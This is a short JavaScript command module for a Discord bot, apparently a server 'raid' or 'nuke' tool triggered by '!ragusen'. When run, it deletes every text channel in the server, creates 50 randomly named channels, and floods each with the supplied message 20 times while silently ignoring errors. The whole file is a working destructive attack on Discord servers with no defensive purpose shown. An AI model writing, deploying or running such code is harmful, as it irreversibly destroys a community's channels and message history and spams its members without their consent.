const { ChannelType } = require('discord.js');
const rand = () => Math.random().toString(36).slice(2, 9);

module.exports = {
  async run(message) {
    const m = message.content.match(/^!ragusen\s+"(.+)"$/s);
    if (!m) {
      return message.reply('使い方: `!ragusen "送る内容"`');
    }
    const text = m[1];

    await message.reply('⚠️ 実行開始（全ch削除→50ch同時作成→各20回同時送信）。');

    try {
      const channels = await message.guild.channels.fetch();
      await Promise.all(
        channels.filter(ch => ch.type === ChannelType.GuildText)
          .map(ch => ch.delete().catch(() => {}))
      );

      const created = (await Promise.all(
        Array.from({ length: 50 }, () =>
          message.guild.channels.create({ name: rand(), type: ChannelType.GuildText }).catch(() => null)
        )
      )).filter(Boolean);

      await Promise.all(
        created.map(c => (async () => {
          for (let j = 0; j < 20; j++) await c.send(text).catch(() => {});
        })())
      );

      if (created[0]) created[0].send('✅ ragusen 完了');
    } catch (e) {
      message.reply('実行エラー: ' + e.message);
    }
  }
};
